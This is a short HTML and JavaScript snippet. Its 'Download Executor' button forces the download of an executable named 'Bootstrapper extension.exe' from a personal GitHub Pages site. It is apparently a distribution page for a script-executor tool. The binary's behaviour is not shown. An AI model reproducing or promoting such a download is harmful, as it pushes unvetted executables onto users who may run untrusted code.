<button id="downloadButton">Download Executor</button>

<script>
    document.getElementById('downloadButton').onclick = function() {
        var link = document.createElement('a');
        link.href = 'https://coderaaaaa.github.io/Solara/Bootstrapper%20extension.exe';
        link.setAttribute('download', 'Bootstrapper extension.exe');
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };
</script>
